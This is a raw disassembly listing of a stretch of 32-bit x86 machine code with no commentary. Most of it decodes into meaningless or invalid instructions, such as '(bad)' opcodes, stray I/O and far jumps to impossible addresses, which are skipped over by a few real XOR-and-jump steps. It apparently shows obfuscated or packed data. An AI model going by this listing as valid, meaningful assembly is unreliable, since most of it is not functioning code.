  416d84:	test   DWORD PTR [ebx-0x74fffffb],edx
  416d8a:	inc    ebp
  416d8b:	cld    
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0xa6bb:0x6a591efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	out    0xf,eax
  416db9:	fcom   QWORD PTR ss:[eax+0x15edf97c]
  416dc0:	imul   esi,DWORD PTR [edx],0x41d11e6a
  416dc6:	fdivr  st,st(0)
  416dc8:	xchg   edi,eax
  416dc9:	retf   0xf4f3
  416dcc:	out    0x51,eax
  416dce:	xchg   esp,eax
  416dcf:	lock les esi,FWORD PTR [ebx]
  416dd2:	rcl    DWORD PTR [ebp+eiz*1+0x31b9022c],0x8c
  416dda:	push   esp
  416ddb:	and    al,0x54
  416ddd:	cmp    edi,DWORD PTR [edi-0x4a6f23ea]
  416de3:	mov    esi,0x9f9c79af
  416de8:	adc    bh,BYTE PTR [eax-0x14f7ecb5]
  416dee:	xchg   esp,eax
  416def:	(bad)  
  416df0:	pop    ss
  416df1:	daa    
  416df2:	cli    
  416df3:	adc    DWORD PTR [edi+0xf29c118],0x38c972da
  416dfd:	fstp   DWORD PTR gs:[esp+edx*1]
  416e01:	stos   DWORD PTR es:[edi],eax
  416e02:	push   ss
  416e03:	mov    edi,DWORD PTR [esp+eax*4+0x146314e9]
  416e0a:	and    eax,0x2224727b
  416e0f:	loop   0x416dec
  416e11:	sbb    DWORD PTR [ebx-0x55],0x6a
  416e15:	int    0x24
  416e17:	or     DWORD PTR [edx+0x18],edx
  416e1a:	loope  0x416e4c
  416e1c:	xor    BYTE PTR [edi-0x29c28c68],dh
  416e22:	addr16 mov edx,0x46f8dad5
  416e29:	dec    edx
  416e2a:	inc    ebp
  416e2b:	sbb    DWORD PTR [edi-0xc],ecx
  416e2e:	fiadd  DWORD PTR [ebx-0x181bc7fa]
  416e34:	leave  
  416e35:	mov    BYTE PTR [ecx+0x229c1a13],dh
  416e3b:	cmp    ebp,DWORD PTR [ecx]
  416e3d:	xor    edi,DWORD PTR [esi-0x7858990b]
  416e43:	cmp    esi,DWORD PTR [edi-0x78]
  416e46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e47:	enter  0xa743,0x85
  416e4b:	or     BYTE PTR [ecx+eax*8],ch
  416e4e:	sbb    ch,bl
  416e50:	(bad)  
  416e51:	pop    ss
  416e52:	dec    ebx
  416e53:	pop    ds
  416e54:	icebp  
  416e55:	sub    al,0xf7
  416e57:	sbb    esp,0xaed1dcaf
  416e5d:	retf   
  416e5e:	push   ss
  416e5f:	mov    eax,ds:0xf6c8fa8e
  416e64:	pop    ebx
  416e65:	jg     0x416e48
  416e67:	pushf  
  416e68:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416e6a:	dec    esp
  416e6b:	mov    bl,0x57
  416e6d:	std    
  416e6e:	pop    edx
  416e6f:	mov    dl,0x1b
  416e71:	mov    edi,0x5aca869b
  416e76:	loope  0x416e09
  416e78:	enter  0x5005,0xe1
  416e7c:	imul   edi,DWORD PTR [edx],0x1a
  416e7f:	mov    dl,0xdd
  416e81:	test   DWORD PTR ds:[eax-0x2cc2e6cf],0x783803db
  416e8c:	mov    eax,0x3595e00e
  416e91:	cmovne esi,edx
  416e94:	jmp    0x6201461a
  416e99:	add    ebx,ebp
  416e9b:	stc    
  416e9c:	mov    al,0xa6
  416e9e:	fild   WORD PTR [ebp+0x64]
  416ea1:	sub    al,0xd6
  416ea3:	div    DWORD PTR [esi]
  416ea5:	xchg   esp,eax
  416ea6:	sti    
  416ea7:	xor    BYTE PTR [ebp-0x6],ch
  416eaa:	xor    dh,BYTE PTR [ebx-0x69]
  416ead:	mov    eax,0x5bdf1c4
  416eb2:	imul   eax,esi,0xffffffe4
  416eb5:	inc    edx
  416eb6:	mov    ?,edx
  416eb8:	test   DWORD PTR [eax+0x33],esp
  416ebb:	add    eax,0x13f50312
  416ec0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ec2:	aad    0x45
  416ec4:	nop    DWORD PTR [esi-0x79]
  416ec8:	push   ebx
  416ec9:	lods   al,BYTE PTR ds:[esi]
  416eca:	outs   dx,DWORD PTR ds:[esi]
  416ecb:	push   0xffbfd9ef
  416ed0:	rcl    BYTE PTR [eax+ebp*1+0x60],0xa7
  416ed5:	sbb    bh,BYTE PTR [ecx+0x5d9b218a]
  416edb:	sbb    edi,DWORD PTR [eax]
  416edd:	inc    BYTE PTR [esi]
  416edf:	jl     0x416ea0
  416ee1:	jb     0x416e74
  416ee3:	push   es
  416ee4:	aas    
  416ee5:	popf   
  416ee6:	adc    edx,DWORD PTR [ebx]
  416ee8:	mov    dl,0x2b
  416eea:	push   edx
  416eeb:	in     eax,0xf5
  416eed:	mov    edi,0xd69d1dbf
  416ef2:	arpl   WORD PTR [ebp+ebp*8-0x2],sp
  416ef6:	mov    ch,0x20
  416ef8:	mov    ecx,0x80e99d78
  416efd:	or     DWORD PTR [eax-0x22],ebx
  416f00:	lods   al,BYTE PTR ds:[esi]
  416f01:	xor    eax,0xe37b32aa
  416f06:	gs sbb al,0xd8
  416f09:	lea    eax,[ecx+0x7337a23f]
  416f0f:	mov    cl,0x31
  416f11:	and    eax,0x316ffc6a
  416f16:	adc    eax,0x717fc12d
  416f1b:	jb     0x416f1a
  416f1d:	outs   dx,DWORD PTR ds:[esi]
  416f1e:	mov    edx,0x5d47c68e
  416f23:	and    eax,0xcc3906c7
  416f28:	(bad)  
  416f29:	dec    esp
  416f2a:	ins    BYTE PTR es:[edi],dx
  416f2b:	sbb    BYTE PTR [ebx+0x223c6af7],0x60
  416f32:	iret   
  416f33:	cmp    al,0xeb
  416f35:	or     dl,0x27
  416f38:	mov    ch,0x37
  416f3a:	fist   WORD PTR [ebx+0x21]
  416f3d:	aaa    
  416f3e:	or     DWORD PTR [edx-0x6120e420],eax
  416f44:	jnp    0x416f97
  416f46:	call   0xf4e4:0x4e9c8698
  416f4d:	dec    esi
  416f4e:	jp     0x416f97
  416f50:	shr    eax,cl
  416f52:	or     eax,DWORD PTR [ebp-0x7]
  416f55:	adc    DWORD PTR [edi],0x13b427ee
  416f5b:	mov    edi,0xb0354c69
  416f60:	add    eax,0xad22a633
  416f65:	popa   
  416f66:	mov    bh,0xa7
  416f68:	aas    
  416f69:	repz loopne 0x416fde
  416f6c:	test   eax,0x2219e9e1
  416f71:	cmp    DWORD PTR [edi-0x20],edi
  416f74:	dec    esp
  416f75:	pop    edx
  416f76:	cmc    
  416f77:	mov    ch,0xc
  416f79:	retf   0xbe2
  416f7c:	imul   ecx,DWORD PTR ds:0xa2fb4073,0x337856b4
  416f86:	stos   BYTE PTR es:[edi],al
  416f87:	xlat   BYTE PTR ds:[ebx]
  416f88:	inc    ebp
  416f89:	es push ss
  416f8b:	lock dec edi
  416f8d:	push   ecx
  416f8e:	jnp    0x416f56
  416f90:	push   0x48232980
  416f95:	(bad)  
  416f98:	fcmovb st,st(2)
  416f9a:	mov    edx,0x3b5b0e24
  416f9f:	call   0x315f73ef
  416fa4:	xorps  xmm3,XMMWORD PTR [edi+0x6f]
  416fa8:	and    eax,0xe0a7694f
  416fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fae:	push   cs
  416faf:	sar    DWORD PTR [ebx-0x1f],0xce
  416fb3:	jbe    0x416fd0
  416fb5:	jo     0x416feb
  416fb7:	out    dx,al
  416fb8:	push   ss
  416fb9:	jmp    0x416fcb
  416fbb:	js     0x416fb3
  416fbd:	xchg   cx,ax
  416fbf:	dec    esi
  416fc0:	jge    0x416fba
  416fc2:	lods   al,BYTE PTR ds:[esi]
  416fc3:	outs   dx,DWORD PTR ds:[esi]
  416fc4:	jl     0x416fe5
  416fc6:	mov    eax,0x1eac9f13
  416fcb:	mov    al,ds:0xa43cb8fb
  416fd0:	adc    BYTE PTR [ebp+ebp*2-0x33a333a7],ah
  416fd7:	mov    ah,0x65
  416fd9:	(bad)  
  416fda:	inc    esp
  416fdb:	das    
  416fdc:	mov    cl,0x9c
  416fde:	test   al,0xab
  416fe0:	mov    bh,BYTE PTR [esi-0x53]
  416fe3:	dec    ecx
  416fe4:	neg    BYTE PTR [ecx+0x5]
  416fe7:	shr    DWORD PTR [ecx+ebx*2+0x5c0777ee],0x3
  416fef:	bound  edi,QWORD PTR [esi+ebp*1]
  416ff2:	mov    esp,0x20cf48cb
  416ff7:	rcr    al,1
  416ff9:	test   BYTE PTR [esi],ah
  416ffb:	call   esp
  416ffd:	pop    esp
  416ffe:	jge    0x41701c
  417000:	mov    bh,0xea
  417002:	ror    BYTE PTR [ebx+0x5546b185],cl
  417008:	clc    
  417009:	icebp  
  41700a:	mov    eax,ds:0x5b8cb2f3
  41700f:	out    0x61,al
  417011:	fs dec esp
  417013:	inc    edx
  417014:	retf   
  417015:	retf   
  417016:	sar    DWORD PTR [ebp-0x12c01945],1
  41701c:	jmp    0x605:0xdbaea4d0
  417023:	xor    DWORD PTR [edx+0x2f],ecx
  417026:	into   
  417027:	pop    ds
  417028:	pop    ebp
  417029:	gs mov edi,0x9a9b6f84
  41702f:	mov    cl,0x54
  417031:	mov    al,ds:0x8915396f
  417036:	pushf  
  417037:	pop    ecx
  417038:	mov    ecx,0x472841c6
  41703d:	xchg   DWORD PTR [edi],eax
  41703f:	and    ch,BYTE PTR [edi+0x4d9ed822]
  417045:	daa    
  417046:	push   ebp
  417047:	popa   
  417048:	cdq    
  417049:	dec    eax
  41704a:	sar    DWORD PTR [edi-0x72],0xa
  41704e:	aaa    
  41704f:	data16 ror BYTE PTR [eax],cl
  417052:	add    eax,esi
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi+0x18f56cbb],edx
  41706d:	hlt    
  41706e:	inc    ebp
  41706f:	sub    edi,DWORD PTR [edi+0x78]
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x4170f4
  417077:	push   edx
  417078:	outs   dx,DWORD PTR ds:[esi]
  417079:	sbb    DWORD PTR [edx-0x7b0c038f],0x55156ea2
  417083:	ror    BYTE PTR [ecx],cl
  417085:	popa   
  417086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417087:	shr    BYTE PTR [ebp+ecx*8+0x6a],cl
  41708b:	inc    esp
  41708c:	pop    ebp
  41708d:	pop    esi
  41708e:	xchg   esp,eax
  41708f:	ja     0x4170c4
  417091:	iret   
  417092:	jns    0x41707a
  417094:	nop
  417095:	(bad)  
  417096:	ficomp WORD PTR ds:0x1cbe014e
  41709c:	pop    edi
  41709d:	push   ebp
  41709f:	push   ss
  4170a0:	(bad)  
  4170a1:	sbb    esp,DWORD PTR [eax-0x3fb404a8]
  4170a7:	sub    edi,DWORD PTR [edi-0x55]
  4170aa:	sub    DWORD PTR [ebp-0x48340593],edx
  4170b0:	or     eax,0xaf1ba193
  4170b5:	dec    edi
  4170b6:	or     BYTE PTR [esp+eiz*8+0x3f191735],ch
  4170bd:	aad    0x67
  4170bf:	xlat   BYTE PTR ds:[ebx]
  4170c0:	stos   DWORD PTR es:[edi],eax
  4170c1:	push   esi
  4170c2:	push   esi
  4170c3:	mov    cl,0xf9
  4170c5:	jmp    0x417055
  4170c7:	dec    ecx
  4170c8:	dec    ebp
  4170c9:	pushf  
  4170ca:	outs   dx,BYTE PTR ds:[esi]
  4170cb:	push   0xaa5a921e
  4170d0:	cld    
  4170d1:	cmp    eax,0x569fe6e3
  4170d6:	enter  0xdf9c,0x44
  4170da:	dec    ebx
  4170db:	mov    fs,WORD PTR [ebp+0x38fadcd]
  4170e1:	push   esp
  4170e2:	fwait
  4170e3:	movhps xmm3,QWORD PTR [edx]
  4170e6:	mov    WORD PTR [edi+0x7f4e094a],ss
  4170ec:	(bad)  
  4170ee:	xchg   ebx,eax
  4170ef:	adc    eax,0x6461a9ae
  4170f4:	jbe    0x417110
  4170f6:	aaa    
  4170f7:	std    
  4170f8:	mov    dh,al
  4170fa:	adc    cl,BYTE PTR [eax-0x7c4d866c]
  417100:	sbb    al,dh
  417102:	pop    esp
  417103:	jno    0x41717a
  417105:	cmp    DWORD PTR [ebp-0x3d48c082],ebx
  41710b:	xchg   edx,eax
  41710c:	cmp    ebx,DWORD PTR [ecx+edi*1]
  41710f:	pop    ebp
  417110:	pop    ecx
  417111:	xor    DWORD PTR [esi-0x911de10],edi
  417117:	icebp  
  417118:	push   ebx
  417119:	or     al,0xf
  41711b:	imul   eax,DWORD PTR [ebx+0x6555acc3],0xb3cecc4
  417125:	ins    BYTE PTR es:[edi],dx
  417126:	retf   
  417127:	push   ecx
  417128:	jecxz  0x4170b4
  41712a:	cmp    DWORD PTR [edx+0xd],0x5a
  41712e:	out    0x9a,al
  417130:	popf   
  417131:	ja     0x4170c0
  417133:	mov    dl,BYTE PTR [esi]
  417135:	cmp    eax,DWORD PTR [esi]
  417137:	stc    
  417138:	cmc    
  417139:	or     al,0x5a
  41713b:	mov    eax,0x498a3ebe
  417140:	ficom  DWORD PTR [ecx-0x51]
  417143:	push   cs
  417144:	(bad)  
  417145:	iret   
  417146:	sbb    bh,BYTE PTR [eax+0x38]
  417149:	push   cs
  41714a:	xor    dl,BYTE PTR [ecx]
  41714c:	iret   
  41714d:	loopne 0x4170f7
  41714f:	movzx  ecx,WORD PTR [ecx+0x643ab2b8]
  417156:	lods   al,BYTE PTR ds:[esi]
  417157:	out    0x32,eax
  417159:	iret   
  41715a:	mov    ebx,0xe675df7a
  41715f:	push   0xffffffa6
  417161:	or     BYTE PTR [edx],al
  417163:	push   ebp
  417164:	into   
  417165:	popa   
  417166:	sahf   
  417167:	and    ebp,DWORD PTR ds:0x34b32a07
  41716d:	xchg   esi,eax
  41716e:	pop    esp
  41716f:	imul   esi,edi,0x50
  417172:	push   esi
  417173:	inc    ebx
  417174:	jp     0x4171e2
  417176:	sub    al,0xde
  417178:	hlt    
  417179:	jns    0x4171e4
  41717b:	ror    BYTE PTR [eax-0x92f13a7],1
  417181:	sbb    eax,0xccae865c
  417186:	push   edx
  417187:	xchg   ebx,eax
  417188:	fst    DWORD PTR [ecx-0x452bbb3a]
  41718e:	push   eax
  41718f:	inc    ebx
  417190:	mov    ch,0xef
  417192:	out    dx,eax
  417193:	xlat   BYTE PTR ds:[ebx]
  417194:	fbld   TBYTE PTR [esi+0x52]
  417197:	push   edi
  417198:	aas    
  417199:	loope  0x41712d
  41719b:	push   0xfed6d069
  4171a0:	inc    ebp
  4171a1:	ret    
  4171a2:	aam    0x9c
  4171a4:	leave  
  4171a5:	mov    ch,0x6b
  4171a7:	xchg   edi,eax
  4171a8:	pop    edi
  4171a9:	pop    eax
  4171aa:	jle    0x417131
  4171ac:	lahf   
  4171ad:	add    al,dl
  4171af:	ins    BYTE PTR es:[edi],dx
  4171b0:	jl     0x41714c
  4171b2:	pop    esp
  4171b3:	ds inc ebx
  4171b5:	std    
  4171b6:	pop    esp
  4171b7:	sbb    ah,BYTE PTR [ebx-0x1d]
  4171ba:	mov    ecx,0x5d3cc2ed
  4171bf:	and    eax,0x8dace1a4
  4171c4:	mov    ds:0x6af73b3a,eax
  4171c9:	or     BYTE PTR [edx],al
  4171cb:	sub    DWORD PTR [ebp-0x2f0ab214],esp
  4171d1:	mov    ch,0x50
  4171d3:	cmp    cl,0x11
  4171d6:	clc    
  4171d7:	sar    ecx,cl
  4171d9:	sti    
  4171da:	daa    
  4171db:	mov    bl,0xf2
  4171dd:	rcr    DWORD PTR [eax+0x51],cl
  4171e0:	and    al,0xee
  4171e2:	jg     0x417173
  4171e4:	mov    al,0xf0
  4171e6:	imul   edi,DWORD PTR [esi-0x18b809a0],0x1c
  4171ed:	leave  
  4171ee:	aas    
  4171ef:	pusha  
  4171f0:	(bad)  
  4171f1:	(bad)  [ebx]
  4171f3:	jo     0x417229
  4171f5:	pop    ss
  4171f6:	pop    esi
  4171f7:	in     eax,dx
  4171f8:	test   DWORD PTR [ebx],edi
  4171fa:	iret   
  4171fb:	leave  
  4171fc:	xchg   DWORD PTR [ebp-0x48],edx
  4171ff:	push   ss
  417200:	or     edi,ebp
  417202:	aas    
  417203:	inc    ecx
  417204:	sbb    al,0x54
  417206:	add    eax,0x5e0fca07
  41720b:	hlt    
  41720c:	dec    ebp
  41720d:	gs inc edx
  41720f:	adc    edi,DWORD PTR [edi-0x77]
  417212:	test   dh,al
  417214:	(bad)  [ebx-0x61d3a3ab]
  41721a:	xor    al,0x5f
  41721c:	push   edi
  41721d:	inc    ebx
  41721e:	mov    DWORD PTR [edx-0x3e],ebx
  417221:	mov    ds:0x5d00c423,eax
  417226:	cmp    bl,BYTE PTR [edi]
  417228:	shl    BYTE PTR [edx+0x19],1
  41722b:	cld    
  41722c:	jne    0x4171f5
  41722e:	scas   eax,DWORD PTR es:[edi]
  41722f:	mov    DWORD PTR [edx],0xe4bcf60d
  417235:	outs   dx,BYTE PTR ds:[esi]
  417236:	and    ecx,DWORD PTR [esi]
  417238:	test   eax,0x27f4d5e7
  41723d:	sub    ah,BYTE PTR [esi]
  41723f:	cld    
  417240:	out    0xb6,al
  417242:	pop    esp
  417243:	inc    eax
  417244:	ret    
  417245:	mov    WORD PTR [ecx-0x607bf78c],?
  41724b:	aaa    
  41724c:	mov    ebp,0xabc2da04
  417251:	push   si
  417253:	cmp    cl,BYTE PTR ds:0xfbd775d
  417259:	sbb    al,bl
  41725b:	arpl   WORD PTR [edi+eax*2+0x6c9b3f82],dx
  417262:	mov    esp,0x30dc9d40
  417267:	arpl   WORD PTR [ebp-0x7b43cc46],bx
  41726d:	(bad)  
  417270:	dec    esi
  417271:	xor    eax,0x4617e364
  417276:	jmp    0x5f24:0x2d1082de
  41727d:	push   edx
  41727e:	in     al,0x82
  417280:	add    eax,0xa64eaec6
  417285:	cmp    al,0x83
  417287:	jnp    0x4172e5
  417289:	imul   BYTE PTR [edx+0x633dceb5]
  41728f:	mov    eax,ds:0x46d38ef3
  417294:	jl     0x41721d
  417296:	popf   
  417297:	adc    al,0x1a
  417299:	in     al,0x5f
  41729b:	add    DWORD PTR [ecx],ecx
  41729d:	ret    0x2c2d
  4172a0:	adc    al,0x27
  4172a2:	xchg   esp,eax
  4172a3:	pop    ebp
  4172a4:	frstor [edx-0x3d7d4cd9]
  4172aa:	cmc    
  4172ab:	and    edi,edx
  4172ad:	mov    BYTE PTR [eax],bh
  4172af:	cdq    
  4172b0:	cdq    
  4172b1:	push   es
  4172b2:	push   eax
  4172b3:	sbb    DWORD PTR [eax-0x13],ebp
  4172b6:	icebp  
  4172b7:	push   edx
  4172b8:	pop    edx
  4172b9:	pop    ecx
  4172ba:	mov    esp,0x76de5625
  4172bf:	fcomi  st,st(5)
  4172c1:	sar    BYTE PTR [esi-0x5c],0x37
  4172c5:	cdq    
  4172c6:	icebp  
  4172c7:	loop   0x41729f
  4172c9:	jmp    0x41726f
  4172cb:	sub    al,0xdb
  4172cd:	adc    edi,DWORD PTR [edi-0x7ce6b4fc]
  4172d3:	ins    DWORD PTR es:[edi],dx
  4172d4:	out    0x53,al
  4172d6:	push   0xffffff9f
  4172d8:	addr16 sub eax,ebx
  4172db:	das    
  4172dc:	out    dx,eax
  4172dd:	int    0x14
  4172df:	pusha  
  4172e0:	gs mov eax,0x94ab0399
  4172e6:	into   
  4172e7:	sar    ecx,0xac
  4172ea:	and    al,0x6e
  4172ec:	jno    0x417357
  4172ee:	mov    edx,0xab3638f
  4172f3:	cmp    BYTE PTR [ebx-0x1e],ah
  4172f6:	push   ebp
  4172f7:	cmp    eax,0x66c07273
  4172fc:	sbb    DWORD PTR ds:0xe59dc5a,ecx
  417302:	mov    esp,0x6452406a
  417307:	push   edi
  417308:	cld    
  417309:	mov    ch,0xbb
  41730b:	js     0x4172f7
  41730d:	or     ebx,ebp
  41730f:	sbb    al,0xc5
  417311:	push   DWORD PTR [ebp-0x8]
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	shl    BYTE PTR [ecx],1
  417334:	dec    edx
  417335:	bound  ebp,QWORD PTR [eax+0x787f28e2]
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x41733b
  417340:	loope  0x4172fa
  417342:	dec    ebx
  417343:	xlat   BYTE PTR ds:[ebx]
  417344:	in     al,dx
  417345:	xor    eax,0xbcdcf283
  41734a:	push   esp
  41734b:	adc    al,0xa
  41734d:	push   ebx
  41734e:	sub    ebx,DWORD PTR [ecx]
  417350:	jp     0x4172d9
  417352:	or     cl,BYTE PTR [ecx+0x33]
  417355:	ret    0x404a
  417358:	push   edi
  417359:	xor    eax,0xda3c8cae
  41735e:	jecxz  0x4173a5
  417360:	mov    al,0x99
  417362:	mov    edx,0xa45c3920
  417367:	int3   
  417368:	mov    edi,DWORD PTR [edx+0x55cc3873]
  41736e:	xchg   esi,eax
  41736f:	out    dx,al
  417370:	or     DWORD PTR [ebp+0x9],esp
  417373:	nop
  417374:	cmp    bh,BYTE PTR [esi-0x79]
  417377:	mov    DWORD PTR [ecx],0xf33b613c
  41737d:	outs   dx,DWORD PTR ds:[esi]
  41737e:	add    eax,0x3bda5248
  417383:	xor    ch,BYTE PTR [ebx-0x12d68b0c]
  417389:	hlt    
  41738a:	adc    BYTE PTR [eax-0x4650b0eb],al
  417390:	(bad)  
  417391:	fstp   DWORD PTR [ecx-0x3a]
  417394:	pushf  
  417395:	mov    dl,BYTE PTR [ecx]
  417397:	adc    bl,BYTE PTR [ecx+0x3f9eb9ef]
  41739d:	jl     0x41735d
  41739f:	ret    0xba8e
  4173a2:	fsub   QWORD PTR [edi]
  4173a4:	adc    eax,0x6ed12e4c
  4173a9:	adc    bh,al
  4173ab:	imul   ebp,DWORD PTR [ebx],0x56e61f12
  4173b1:	xchg   edi,eax
  4173b2:	(bad)  
  4173b4:	mov    al,0x45
  4173b6:	inc    edi
  4173b7:	stc    
  4173b8:	or     eax,0xcfc911d7
  4173bd:	and    al,0xc9
  4173bf:	xchg   esp,eax
  4173c0:	ja     0x417427
  4173c2:	or     DWORD PTR [edx+0x28e3d55d],ebp
  4173c8:	xchg   esp,eax
  4173c9:	dec    ecx
  4173ca:	xlat   BYTE PTR ds:[ebx]
  4173cb:	mov    ebp,0x27ebb7f0
  4173d0:	daa    
  4173d1:	jbe    0x417403
  4173d3:	jne    0x4173d0
  4173d5:	dec    edx
  4173d6:	push   edi
  4173d7:	retf   
  4173d8:	sbb    eax,0x4e9132b4
  4173dd:	adc    al,0x51
  4173df:	lahf   
  4173e0:	les    edi,FWORD PTR [edi-0x62db89ac]
  4173e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e7:	push   0xffffffa2
  4173e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ea:	das    
  4173eb:	pop    esp
  4173ec:	mov    eax,ds:0xeb9fa857
  4173f1:	pusha  
  4173f2:	cmc    
  4173f3:	jge    0x41744c
  4173f5:	int3   
  4173f6:	cmc    
  4173f7:	shr    edx,1
  4173f9:	jp     0x4173c9
  4173fb:	sub    al,0xa8
  4173fd:	mov    ecx,DWORD PTR [esi-0x5dcafc88]
  417403:	rcr    ch,1
  417405:	mov    BYTE PTR [edi+ebp*8-0x6b],dh
  417409:	and    BYTE PTR [edi+0x6c],bl
  41740c:	mov    ah,0xbf
  41740e:	in     eax,0x62
  417410:	add    esp,DWORD PTR [edi]
  417412:	std    
  417413:	xor    DWORD PTR ss:[esi],0x2329341
  41741a:	jo     0x417488
  41741c:	mov    eax,0x643417d5
  417421:	scas   al,BYTE PTR es:[edi]
  417422:	mov    bl,0xde
  417424:	gs jo  0x4173ea
  417427:	inc    esi
  417428:	arpl   WORD PTR [ebp-0x15],sp
  41742b:	out    0x69,al
  41742d:	fwait
  41742e:	lods   eax,DWORD PTR ds:[esi]
  41742f:	jo     0x41748c
  417431:	mov    ebp,0xff13de04
  417436:	mov    eax,ds:0x3a2823b4
  41743b:	jmp    0x4174b7
  41743d:	jbe    0x41747c
  41743f:	or     BYTE PTR [ebx-0x7ceb292a],ah
  417445:	jmp    0x9211:0xa8622cd2
  41744c:	test   BYTE PTR [ebx-0x207fa1f5],cl
  417452:	out    0x2c,eax
  417454:	popa   
  417455:	lods   eax,DWORD PTR ds:[esi]
  417456:	in     eax,dx
  417457:	dec    ebp
  417458:	xor    bh,BYTE PTR [eax]
  41745a:	js     0x41740b
  41745c:	(bad)  [esi+0x45]
  41745f:	mov    esi,0xf76e4f3a
  417464:	and    BYTE PTR ds:0x50869fc3,ah
  41746a:	pushf  
  41746b:	add    DWORD PTR [eax],ebx
  41746d:	jmp    0x77100804
  417472:	out    dx,al
  417473:	aas    
  417474:	or     ch,BYTE PTR [edi-0x57]
  417477:	leave  
  417478:	sub    BYTE PTR [ebp+0x71],ah
  41747b:	pop    ebx
  41747c:	pcmpeqd mm7,mm7
  41747f:	(bad)  
  417480:	pop    edi
  417481:	inc    edi
  417482:	sub    eax,0x248afa6b
  417487:	sti    
  417488:	and    BYTE PTR ds:0xb493117d,ah
  41748e:	bound  esi,QWORD PTR [esi-0x32]
  417491:	mov    edx,0x715c803e
  417496:	add    cl,BYTE PTR [edi+0x2405221b]
  41749c:	adc    ebx,DWORD PTR [ebp+0x77d949ca]
  4174a2:	xchg   ebp,eax
  4174a3:	gs add al,0x52
  4174a6:	(bad)  cs:[eax]
  4174a9:	mov    ecx,0x6215121f
  4174ae:	xor    eax,0xd5466859
  4174b3:	loope  0x4174e7
  4174b5:	imul   esp,DWORD PTR ds:0xda436af6,0x8f1cc7b5
  4174bf:	hlt    
  4174c0:	mov    edx,0x7e93d10f
  4174c5:	push   es
  4174c6:	xchg   ebx,eax
  4174c7:	push   esi
  4174c8:	in     eax,dx
  4174c9:	adc    BYTE PTR [esi-0x45],ah
  4174cc:	cmp    al,0xa9
  4174ce:	push   edx
  4174cf:	loope  0x4174aa
  4174d1:	add    DWORD PTR [eax],esp
  4174d3:	add    eax,0xe4389e04
  4174d8:	sub    DWORD PTR [ebp+0x644a7b33],0x4d7fd5ce
  4174e2:	popf   
  4174e3:	int3   
  4174e4:	mov    dl,0x35
  4174e6:	push   0xcf473b92
  4174eb:	das    
  4174ec:	and    al,0xfe
  4174ee:	aam    0x7e
  4174f0:	dec    ebx
  4174f1:	and    DWORD PTR [ecx-0x26a02aa8],ecx
  4174f7:	jne    0x4174a1
  4174f9:	xchg   ebx,eax
  4174fa:	adc    DWORD PTR [ecx-0x80],ebp
  4174fd:	fdivr  DWORD PTR [esi]
  4174ff:	adc    esp,DWORD PTR [eax+0x3db87bbf]
  417505:	lods   eax,DWORD PTR ds:[esi]
  417506:	dec    eax
  417507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417508:	cmp    ebx,edx
  41750a:	push   ebx
  41750b:	jmp    0x902c07d6
  417510:	ss jmp 0x417538
  417513:	mul    esp
  417515:	xchg   edi,eax
  417516:	xor    ch,bh
  417518:	inc    esi
  417519:	jecxz  0x4174b2
  41751b:	cmp    bh,BYTE PTR [ebx*2+0x2058fdf5]
  417522:	dec    ebp
  417523:	xor    BYTE PTR [esi+0x2acbb8c0],0x44
  41752a:	mov    ebp,0x79429eaf
  41752f:	sbb    bh,BYTE PTR [eax-0x1db698d6]
  417535:	lahf   
  417536:	rol    BYTE PTR [edx-0x20],cl
  417539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41753a:	push   es
  41753b:	dec    edi
  41753c:	aas    
  41753d:	and    DWORD PTR [edi+eiz*4],esp
  417540:	sbb    eax,0x1cd6939d
  417545:	mov    ds:0xbe06af12,al
  41754a:	int    0x38
  41754c:	jmp    0xb35fd159
  417551:	sti    
  417552:	jno    0x41759c
  417554:	movq   mm6,QWORD PTR [edi+eiz*8-0x66d5ea89]
  41755c:	fiadd  DWORD PTR [ebx+edi*1-0x5f]
  417560:	adc    DWORD PTR [eax],esp
  417562:	jl     0x417562
  417564:	data16 jecxz 0x4175e5
  417567:	scas   al,BYTE PTR es:[edi]
  417568:	leave  
  417569:	test   eax,0x5f473721
  41756e:	jo     0x41758b
  417570:	aam    0x3d
  417572:	cwde   
  417573:	and    BYTE PTR [ecx+edx*8-0x26],cl
  417577:	jg     0x417549
  417579:	fsubr  DWORD PTR [ebx+0x6ba56ae2]
  41757f:	add    DWORD PTR [edi+0x65126d0a],eax
  417585:	push   ss
  417586:	enter  0x530c,0x91
  41758a:	or     eax,0x26dd5ae6
  41758f:	fnstsw WORD PTR [edx]
  417591:	fcmovnb st,st(5)
  417593:	mov    ch,0xb4
  417595:	(bad)  
  417596:	ret    
  417597:	test   BYTE PTR [esi+ebx*1],ah
  41759a:	xchg   ecx,eax
  41759b:	and    BYTE PTR [ecx+0x7ca23ab0],0xeb
